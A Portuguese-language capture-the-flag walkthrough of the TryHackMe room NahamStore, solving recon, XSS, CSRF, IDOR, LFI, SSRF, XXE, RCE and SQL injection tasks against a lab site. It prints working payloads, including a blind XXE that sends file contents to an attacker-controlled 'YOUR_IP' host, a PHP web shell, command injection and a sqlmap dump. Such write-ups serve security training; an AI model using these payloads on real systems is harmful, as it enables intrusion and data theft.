# Duckware Team - NahamStore
###### Solved by @Antonio-alexandre

> This TryHackMe room is about bug bounty hunting and web application hacking

## Desafio: NahamStore - TryHackMe
#### Introdução

Este desafio visa avaliar habilidades de bug bounty em aplicações web, envolvendo múltiplas vulnerabilidades, como XSS, CSRF, IDOR, entre outras. Cada seção da sala contém um tema diferente a ser explorado.

É necessário adicionar o ip da máquina e nahamstore.thm em /etc/hosts.

#### Primeiros passos

Como se trata de uma aplicação web completa, os primeiros passos sempre são o reconhecimento do site.

Após adicionar o ip e o url do site, o primeiro passo executado foi utilizar o nmap para mapear as portas utilizadas pela aplicação. Para isso, foi utilizado o comando:

`nmap -sC -sV -p- -T4 -min-rate=9326 -vv (IP)`

O resultado foi o seguinte:

```
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 84:6e:52:ca:db:9e:df:0a:ae:b5:70:3d:07:d6:91:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk0dfNL0GNTinnjUpwRlY3LsS7cLO2jAp3QRvFXOB+s+bPPk+m4duQ95Z6qagERl/ovdPsSJTdiPXy2Qpf+aZI4ba2DvFWfvFzfh9Jrx7rvzrOj0i0kUUwot9WmxhuoDfvTT3S6LmuFw7SAXVTADLnQIJ4k8URm5wQjpj86u7IdCEsIc126krLk2Nb7A3qoWaI+KJw0UHOR6/dhjD72Xl0ttvsEHq8LPfdEhPQQyefozVtOJ50I1Tc3cNVsz/wLnlLTaVui2oOXd/P9/4hIDiIeOI0bSgvrTToyjjTKH8CDet8cmzQDqpII6JCvmYhpqcT5nR+pf0QmytlUJqXaC6T
|   256 1a:1d:db:ca:99:8a:64:b1:8b:10:df:a9:39:d5:5c:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC/YPu9Zsy/Gmgz+aLeoHKA1L5FO8MqiyEaalrkDetgQr/XoRMvsIeNkArvIPMDUL2otZ3F57VBMKfgydtBcOIA=
|   256 f6:36:16:b7:66:8e:7b:35:09:07:cb:90:c9:84:63:38 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPAicOmkn8r1FCga8kLxn9QC7NdeGg0bttFiaaj11qec
80/tcp   open  http    syn-ack ttl 62 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 6143058E4F53A9585405510F34C19104
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: NahamStore - Setup Your Hosts File
|_http-server-header: nginx/1.14.0 (Ubuntu)
8000/tcp open  http    syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Percebe-se então, que há três portas que serão bem úteis, uma SSH 22 e duas HTTP, uma 80 e uma 8000. Essa informação será guardada, pois será útil posteriormente.

Após isso, foi utilizada uma ferramenta chamada ffuf, através do seguinte comando:

`ffuf -u http://nahamstore.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST: FUZZ.nahamstore.thm" -mc all -fw 125 -s`

Com esse comando, foi possível obter todos os subdomínios do site. A resposta do comando foi a seguinte:

```
www
shop
marketing
stock
#www
#mail
#smtp
#pop3
```

Com essas informações então, basta adicionar todos os subdomínios do site no /etc/hosts. Ficando assim:

[![image.png](https://i.postimg.cc/C5nd41Pf/image.png)](https://postimg.cc/gLdYzYPY)

Acessando o site então, aparece o seguinte:

[![image.png](https://i.postimg.cc/15pDxCBN/image.png)](https://postimg.cc/7fZ50Npx)

Como é possível notar, há várias funções, como a de login e registro, dois produtos registrados, e sistema de carrinho.

Outro passo muito importante em aplicações assim, é executar o gobuster (ou dirbuster) para tentar encontrar outros diretórios que poderão ser úteis. Para esse caso, foi utilizado o seguinte comando:

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.81.129.197 `

Foi possível encontrar então, os seguintes diretórios:

```
/search               (Status: 200) [Size: 3351]
/login                (Status: 200) [Size: 3099]
/register             (Status: 200) [Size: 3138]
/uploads              (Status: 301) [Size: 178] [--> http://127.0.0.1/uploads/]
/staff                (Status: 200) [Size: 2287]
/css                  (Status: 301) [Size: 178] [--> http://127.0.0.1/css/]
/js                   (Status: 301) [Size: 178] [--> http://127.0.0.1/js/]
/logout               (Status: 302) [Size: 0] [--> /]
/basket               (Status: 200) [Size: 2465]
/returns              (Status: 200) [Size: 3628]
```

Acessando cada um dos subdomínios do site, descobre-se que `www` e `shop` apenas redirecionam à página principal do site. Já `marketing` e `stock` são diferentes. 

Acessando `marketing`, é possível encontrar algumas ofertas:

[![image.png](https://i.postimg.cc/hj2c7BKQ/image.png)](https://postimg.cc/k6RkkL67)

Já acessando `stock`, é possível perceber que se trata de uma api, com um endpoint `/product`:

[![image.png](https://i.postimg.cc/pV9LnmnT/image.png)](https://postimg.cc/0rssT2nR)

Voltando à porta 8000, executando o gobuster com o comando abaixo, retorna o seguinte:

`gobuster dir -u "http://nahamstore.thm:8000" -w /usr/share/wordlists/dirb/big.txt -t 64 -r`

```
/admin                (Status: 200) [Size: 1489]
/robots.txt           (Status: 200) [Size: 30]
```

Acessando o endpoint /admin, ele redireciona para a seguinte página:

[![image.png](https://i.postimg.cc/D0QDbQrq/image.png)](https://postimg.cc/YL985Wy9)

Como é possível notar no `robots.txt`, essa página não era pra um usuário comum conseguir acessar.



##### Task 03 - Recon

 * Jimmy Jones SSN

Resp: 521-61-6392

Explicação: A forma como foi obtida a resposta, é explicada na Task 09.


##### Task 04 - XSS

* Enter an URL ( including parameters ) of an endpoint that is vulnerable to XSS

Resp: http://marketing.nahamstore.thm/?error=

Explicação: Ao acessar o subdomínio `marketing`, e tentar modificar um caractere qualquer no URL de alguma das opções do marketing, ele redireciona para a página inicial, e a mensagem de erro aparece logo na URL, permitindo assim que ela seja modificada.

Exemplo: a URL do `Pre Opening Interest` é a seguinte:

`http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c`

Se alterar qualquer caractere dessa URL (não pode aumentar a quantidade), ele redireciona para a seguinte página:

[![image.png](https://i.postimg.cc/Dy77nhXh/image.png)](https://postimg.cc/z32sF972)

Como é possível notar, a mensagem de erro é passada diretamente na URL: 

`http://marketing.nahamstore.thm/?error=Campaign+Not+Found`

Permitindo assim, que o XSS funcione:

[![image.png](https://i.postimg.cc/nLDyqSDs/image.png)](https://postimg.cc/XZn1b8x3)


* What HTTP header can be used to create a Stored XXS

Resp: User-Agent

Explicação: Para essa questão, é necessário criar um Address no Address Book. Após isso, basta realizar um pedido para o endereço que foi adicionado. Ao fazer isso, aparece o seguinte:

[![image.png](https://i.postimg.cc/NGJdf7yK/image.png)](https://postimg.cc/fkdc8dfs)

Como é possível notar, o User Agent é exibido. O que significa que ele pode ser manipulado para executar funções que o site não deveria.

Ao realizar o pedido, basta alterar o User-Agent para algo diferente do esperado:

[![image.png](https://i.postimg.cc/SswGFqQP/image.png)](https://postimg.cc/VrWtnxC9)

Quando a página carregar:

[![image.png](https://i.postimg.cc/bwz9jm8J/image.png)](https://postimg.cc/rKPr1CDX)

* What HTML tag needs to be escaped on the product page to get the XSS to work?

Resp: title

Explicação: Para essa questão, é necessário acessar a página de qualquer produto.
Ao analisar o código fonte, é possível notar que o nome do produto 1é armazenado na tag `<h1>`, porém, alterar o nome do produto na URL, muda o nome dele na tab do navegador:

[![image.png](https://i.postimg.cc/43RZdHLx/image.png)](https://postimg.cc/dh6gN3cb)

Isso ocorre, pois o que é digitado acima, é armazenado na tag `<title>`. Para ocorrer o XSS, é necessário fechar essa tag para conseguir executar qualquer coisa. Fazendo isso:

[![image.png](https://i.postimg.cc/prp3kPG3/image.png)](https://postimg.cc/Zvzf5zhL)

* What JavaScript variable needs to be escaped to get the XSS to work?

Resp: search

Explicação: Ao pesquisar um produto na página inicial, e analisando o código fonte, é possível encontrar o seguinte trecho:

```
    var search = 'hoodie';
    $.get('/search-products?q=' + search,function(resp){
        if( resp.length == 0 ){

            $('.product-list').html('<div class="text-center" style="margin:10px">No matching products found</div>');

        }else {
            $.each(resp, function (a, b) {
                $('.product-list').append('<div class="col-md-4">' +
                    '<div class="product_holder" style="border:1px solid #ececec;padding: 15px;margin-bottom:15px">' +
                    '<div class="image text-center"><a href="/product?id=' + b.id + '"><img class="img-thumbnail" src="/product/picture/?file=' + b.img + '.jpg"></a></div>' +
                    '<div class="text-center" style="font-size:20px"><strong><a href="/product?id=' + b.id + '">' + b.name + '</a></strong></div>' +
                    '<div class="text-center"><strong>$' + b.cost + '</strong></div>' +
                    '<div class="text-center" style="margin-top:10px"><a href="/product?id=' + b.id + '" class="btn btn-success">View</a></div>' +
                    '</div>' +
                    '</div>');
            });
        }
    });
```

Há a variável `search` nesse trecho. Através dela, é possível enviar qualquer código desejado, basta apenas finalizar a aspas, e logo após o final do payload, digitar `//` para comentar o restante da linha.

O payload utilizado foi o seguinte:

`http://nahamstore.thm/search?q=%27%2Balert(document.domain.concat(%22\n%22).concat(window.origin))%2B%27`

Fazendo isso:

[![image.png](https://i.postimg.cc/SsqMWssn/image.png)](https://postimg.cc/Jy608Rj8)

* What hidden parameter can be found on the shop home page that introduces an XSS vulnerability.

Resp: q 

Explicação: Voltando novamente para a questão anterior, é possível notar que logo após o search, ele passa um parâmetro vulnerável diretamente na URL. Essa é a resposta para a questão atual.

* What HTML tag needs to be escaped on the returns page to get the XSS to work?

Resp: textarea

Explicação: Para essa questão, ao acessar a página `/returns`, é possível encontrar o seguinte:

```
<form method="post" enctype="multipart/form-data">
                        <div><label>Order Number:</label></div>
                        <div><input name="order_number" class="form-control"></div>
                        <div style="margin-top:7px"><label>Return Reason:</label></div>
                        <div>
                            <select class="form-control" name="return_reason">
                                <option value="0">Please Choose...</option>
                                <option value="1">Wrong Size</option>
                                <option value="2">Damaged Goods</option>
                                <option value="3">No Longer Required</option>
                            </select>
                        </div>
                        <div style="margin-top:7px"><label>Return Information:</label></div>
                        <div><textarea name="return_info" class="form-control"></textarea></div>
                                                <div style="margin-top:7px"><input type="submit" class="btn btn-success pull-right" value="Create Return"></div>
                    </form>
```

Como é possível notar, o local `return_info` é vulnerável.

* What is the value of the H1 tag of the page that uses the requested URL to create an XSS

Resp: Page Not Found

Explicação: Ao tentar acessar qualquer página que não existe, como `nahamstore.thm/DUCK`, ele retorna o seguinte no código fonte:

```
    <div class="container" style="margin-top:120px">
        <h1 class="text-center">Page Not Found</h1>
        <p class="text-center">Sorry, we couldn't find /DUCK anywhere</p>
    </div>
```

Esse é o trecho vulnerável a XSS

* What other hidden parameter can be found on the shop which can introduce an XSS vulnerability

Resp: discount

Explicação: Em qualquer página de produto, é possível verificar que há o parâmetro discount:

```
<div style="margin-bottom:10px"><input placeholder="Discount Code" class="form-control" name="discount" value=""></div>
```

Porém, se utilizar o parâmetro discount como um GET, ele reflete no campo input.

Para isso, basta utilizar o seguinte payload diretamente na URL:

`http://nahamstore.thm/product?id=1&added=1&discount=%22%20autofocus%20onfocus=alert(document.domain.concat(%22\n%22).concat(window.origin))%20a=%22`

Fazendo isso:

[![image.png](https://i.postimg.cc/prp3kPG3/image.png)](https://postimg.cc/Zvzf5zhL)

##### Task 05 - Open Redirect

* Open Redirect One

Resp: r

Explicação: Para essa questão, basta executar o seguinte comando no ffuf:

`ffuf -u "http://nahamstore.thm/?FUZZ=https://youtube.com" -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-words-lowercase.txt -ac`

Fazendo isso, ele retorna o seguinte:

```
r                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 208ms]
q                       [Status: 200, Size: 4273, Words: 985, Lines: 83, Duration: 210ms]
```

* Open Redirect Two

Resp: redirect_url

Explicação: Para essa questão, foi necessário tentar acessar qualquer página que precisa de autenticação, como um usuário não autenticado. Ao analisar a URL, é possível perceber que ele redireciona para uma página.

Exemplo: `http://nahamstore.thm/login?redirect_url=/account/settings`.

Basta então, alterar o redirect_url para qualquer url que desejar. Exemplo:

`http://nahamstore.thm/login?redirect_url=https://youtube.com`

##### Task 06 - CSRF

* What URL has no CSRF protection

Resp: http://nahamstore.thm/account/settings/password

Explicação: A página de troca de senha, possui uma vulnerabilidade CSRF. Ela pode ser encontrada em:

```
<html>
  <body>
    <form action="http://nahamstore.thm/account/settings/password">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Esse trecho permite que a requisição seja enviada sem precisar de qualquer interação do usuário. Além disso, como não contém o token CSRF, permite com que qualquer usuário que contenha o cookie altere o valor da senha.

* What field can be removed to defeat the CSRF protection

Resp: csrf_protect

Explicação: Na página de troca de e-mail, é possível encontrar o seguinte trecho de código:

```
<form method="post">
    <input type="hidden" name="csrf_protect" value="eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpNeE1EUXdNREkySW4wPSIsInNpZ25hdHVyZSI6IjQyZWY1OWJlNTM2YTcxOTU5ZDQ0OGJmODc1N2Q1NDZhIn0=">
    <div><label>Email:</label></div>
    <div><input class="form-control" name="change_email" value="noraj@noraj.fr" ></div>
    <div style="margin-top:7px">
        <input type="submit" class="btn btn-success pull-right" value="Change Email"></div>
</form>
```

Remover esse parâmetro, permite o CSRF, pois ele é a única proteção no código.

* What simple encoding is used to try and CSRF protect a form

Resp: base64

Explicação: Na página de desabilitar uma conta, é possível encontrar o seguinte trecho:

```
<form method="post">
    <input type="hidden" name="action" value="disable">
    <input type="hidden" name="csrf_disable_protect" value="NA==">
    <p></p>
    <div style="margin-top:7px">
        <p>Please only click the below button if you are 100% sure you wish to disable your account. All your data will be lost.</p>
        <input type="submit" class="btn btn-danger pull-right" value="Disable Account"></div>
</form>
```

Nesse trecho, é possível notar o valor `NA==`. Esse valor, é o id do usuário codificado em base64 para "proteger". `NA==` = 4 em base64

##### Task 07 - IDOR

* First Line of Address

Resp: 160 Broadway

Explicação: Para o IDOR, é necessário adicionar um endereço, e quando for confirmar para enviar para o endereço, interceptar a requisição no BurpSuite, e alterar o address_id para o desejado:

[![image.png](https://i.postimg.cc/DyL0vh5X/image.png)](https://postimg.cc/Ln42Drc9)

* Order ID 3 date and time

Resp: 22/02/2021 11:42:13

Explicação: Para essa questão, é necessário explorar a funcionalidade PDF. Quando você pede parar gerar o PDF, o ID é passado na requisição:

```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://nahamstore.thm
Connection: keep-alive
Referer: http://nahamstore.thm/account/orders/6
Cookie: token=d1caf2a74471fce2a2f0872c70b7e663; session=cacc3c92f3a0318dd7dbea5523a2822f
Upgrade-Insecure-Requests: 1
Priority: u=0, i

what=order&id=6
```

É possível então alterar o payload para `what=order&id=3%26user_id=3`, fazendo com que ele peça o pedido com id 3, porém estando logado como usuário 3:

[![image.png](https://i.postimg.cc/0NbqNdxV/image.png)](https://postimg.cc/5Hdr7zXz)


##### Task 08 - Local File Inclusion

* LFI Flag

Resp: {7ef60e74b711f4c3a1fdf5a131ebf863}

Explicação: Analisando o histórico das requisições HTTP, é possível encontrar duas requisições GET que acessam as imagens dos produtos. Através dela, é possível utilizar um Path Traversal para acessar o arquivo da flag na questão.

Ao tentar apenas acessar o arquivo /etc/passwd, ele retorna o seguinte:

[![image.png](https://i.postimg.cc/8P549ybb/image.png)](https://postimg.cc/xqwLb3hk)

Ao tentar utilizar ../ para tentar um bypass, ele retorna o seguinte:

[![image.png](https://i.postimg.cc/mk6YTsS8/image.png)](https://postimg.cc/0KDMChFw)

Então, ao tentar outra técnica, no caso ....//, ele retorna o seguinte:

[![image.png](https://i.postimg.cc/NMsmTMJb/image.png)](https://postimg.cc/8FY7g1Vr)

Basta então alterar o valor para /lfi/flag.txt

Obtendo assim a flag:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 12 Mar 2026 00:44:02 GMT
Content-Type: image/jpeg
Connection: keep-alive
Set-Cookie: session=cacc3c92f3a0318dd7dbea5523a2822f; expires=Thu, 12-Mar-2026 01:44:02 GMT; Max-Age=3600; path=/
Content-Length: 34

{7ef60e74b711f4c3a1fdf5a131ebf863}
```

##### Task 09 - SSRF

* Credit Card Number For Jimmy Jones

Resp: 

Explicação: Essa vulnerabilidade é encontrada na função `Check Stock`. Ao acessar a requisição, é possível notar que ele passa alguns parâmetros:

```
POST /stockcheck HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 40
Origin: http://nahamstore.thm
Connection: keep-alive
Referer: http://nahamstore.thm/product?id=2
Cookie: token=d1caf2a74471fce2a2f0872c70b7e663; session=cacc3c92f3a0318dd7dbea5523a2822f
Priority: u=0

product_id=2&server=stock.nahamstore.thm
```

Adicionando `@nahamstore.thm#` no parâmetro server, é possível acessar a página inicial, pois a # comenta o resto da linha.

Para este caso, foi utilizado o ffuf novamente, com o seguinte comando:

`ffuf -u "http://nahamstore.thm/stockcheck" -w /usr/share/wordlists/SecLists-master/Discovery/DNS/dns-Jhaddix.txt -X POST -d 'product_id=1&server=stock.nahamstore.thm@FUZZ.nahamstore.thm#' -t 64 -ac`

Esse comando, ele tenta encontrar o subdomínio necessário. Depois de um longo tempo, ele encontrou o subdomínio `/orders`. Adicionando isso na requisição, é possível obter o seguinte:

[![image.png](https://i.postimg.cc/85N96RVS/image.png)](https://postimg.cc/hJZ2F7jy)

Varrendo a lista, foi possível obter as informações do cartão do Jimmy Jones:

[![image.png](https://i.postimg.cc/WbCynLPd/image.png)](https://postimg.cc/JG3KrF08)

Voltando para a Task 03, basta adicionar o subdominio (caso ainda não tenha adicionado): `nahamstore-2020-dev.nahamstore.thm`. Após isso, bastou acessar o seguinte site através de um curl, já que descobriu-se o ID do Jimmy Jones:

`http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2`

Fazendo isso, se obtém o seguinte:

`{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}`

##### Task 10 - XXE

* XXE Flag

Resp: {9f18bd8b9acaada53c4c643744401ea8}

Explicação: Utilizando novamente o endpoint stock, foi utilizado o seguinte comando para obter algum parâmetro que podia ser vulnerável a xxe:

`ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u 'http://stock.nahamstore.thm/product/1?FUZZ=test' -mc all -fs 41 -s`

Com esse comando, foi possível obter o parâmetro `xml`.

Passando esse parâmetro em uma requisição GET, obtém-se o seguinte:

[![image.png](https://i.postimg.cc/yd7683Qd/image.png)](https://postimg.cc/5HkWPyMd)

Se tentar enviar novamente um POST, aparece o seguinte:

```
HTTP/1.1 400 Bad Request
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 12 Mar 2026 01:12:12 GMT
Content-Type: application/xml; charset=utf-8
Connection: keep-alive
Content-Length: 71

<?xml version="1.0"?>
<data><error>Invalid XML supplied</error></data>
```

Ou seja, é vulnerável a XXE.

Foi realizado então um teste, de passar o resultado da requisição como parâmetro:

[![image.png](https://i.postimg.cc/qRFFZ9CG/image.png)](https://postimg.cc/cgQTvkhK)

Isso significa que é necessário passar um X-Token como parâmetro. Para resolver essa questão, foi utilizado o seguinte payload:
```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<data><X-Token>&xxe;</X-Token></data>
```

Executando isso, obtém-se:

```
HTTP/1.1 401 Unauthorized
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 12 Mar 2026 01:15:06 GMT
Content-Type: application/xml; charset=utf-8
Connection: keep-alive
Content-Length: 104

<?xml version="1.0"?>
<data><error>X-Token {9f18bd8b9acaada53c4c643744401ea8}
is invalid</error></data>
```

* Blind XXE Flag

Resp: {d6b22cb3e37bef32d800105b11107d8f}

Explicação: Para essa questão, o endpoint explorado foi `/staff`. Nesse endpoint, é possível notar que ele permite enviar arquivos `.xlsx`. Esse tipo de arquivos, pode ser criado através do LibreOffice Calc. Criando o arquivo, e extraindo ele com o seguinte comando:

`7z x -oXXE xxe.xlsx`

É possível obter alguns diretórios.

O próximo passo, é alterar o xl/workbook.xml para:

```<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://IP/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
...
```

Após isso, voltei para a pasta XXE, e executei o seguinte comando para compactar tudo: `7z u ../xxe.xlsx *`

Após isso, criei uma pasta nova, e dentro dela adicionei um arquivo `hack.xml` com o seguinte payload:

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://YOUR_IP/dtd.xml?%data;'>">
```

Depois, apenas enviei o arquivo xlsx modificado para o site:

Obtive então a seguinte resposta:

`"GET /e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo= HTTP/1.0" 404`

Decodificando isso, obtém-se a flag.


##### Task 11 - RCE

* First RCE flag

Resp: {b42d2f1ff39874d56132537be62cf9e3} 

Explicação: Na página de `admin`, é possível modificar a descrição de uma oferta dentro da página `marketing`. O primeiro passo é logar no terminal admin com as credenciais: `admin` `admin`.

Testando um pouco, foi obtida a informação de que é possível executar um reverse shell php, através do seguinte payload adicionado logo abaixo da tag html:

```
<?php system($_REQUEST['cmd']); ?>
```

Após isso, basta executar cat /flag.txt diretamente pela URL, desse modo:

`http://marketing.nahamstore.thm/09c2afcff60bb4dd3af7c5c5d74a482f?cmd=cat%20/flag.txt`

* Second RCE flag

Resp: {93125e2a845a38c3e1531f72c250e676}

Explicação: A segunda flag, é encontrada no campo de PDF. Lá, contém a seguinte requisição:

```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://nahamstore.thm
Connection: keep-alive
Referer: http://nahamstore.thm/account/orders/4
Cookie: token=95c36b34edc3945d49bc1809684134ca; session=43c68e4ac236398b3b5e532c37b5c117
Upgrade-Insecure-Requests: 1
Priority: u=0, i

what=order&id=4
```

Nessa requisição, ao adicionar id entre ` logo após o final da linha, é possível executar comandos. Basta então, adicionar cat /flag.txt, que ele retorna o seguinte dentro do pdf:

`Cannot find order: 4{93125e2a845a38c3e1531f72c250e676}`



##### Task 12 - SQL Injection

* Flag 1

Resp: {d890234e20be48ff96a2f9caab0de55c}

Explicação: Esse SQLI foi fácil de identificar. Ele está no endpoint `/product?id=`.

Basta digitar o seguinte logo após o id:

`id=0 UNION SELECT 1,flag,3,4,5 from sqli_one-- -`

* Flag 2 (blind)

Resp: 

Explicação: Esse segundo SQLi, é necessário acessar o endpoint `/returns`. Para isso, basta capturar a requisição e salvá-la em um arquivo .txt.

Após isso, basta executar o seguinte comando:

`sqlmap -r r.txt --dbms='MySQL' -D nahamstore --dump --threads 10`

Obtendo assim o seguinte:

```
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
got a 302 redirect to 'http://nahamstore.thm:80/returns/134?auth=02522a2b2726fb0a03bb19f2d8d9524d'. Do you want to follow? [Y/n] n
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
(custom) POST parameter 'MULTIPART order_number' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
[...]

Database: nahamstore
Table: sqli_two
[1 entry]
+----+------------------------------------+
| id | flag                               |
+----+------------------------------------+
| 1  | {212ec3b036925a38b7167cf9f0243015} |
+----+------------------------------------+
```

#### Conclusão

